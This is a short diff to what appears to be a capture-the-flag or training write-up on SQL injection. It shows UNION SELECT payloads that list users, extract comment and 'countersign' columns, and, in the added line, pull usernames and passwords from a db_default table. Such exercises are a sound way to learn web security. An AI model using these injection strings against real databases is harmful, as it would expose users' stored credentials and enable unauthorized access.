@@ -31,3 +31,5 @@ To identify the flag :
 `0 UNION SELECT user_id, first_name FROM Member_Sql_Injection.users`
 
 And to get its confidentials values : `0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users WHERE user_id = 5`
+
+0 UNION SELECT username, password FROM db_default
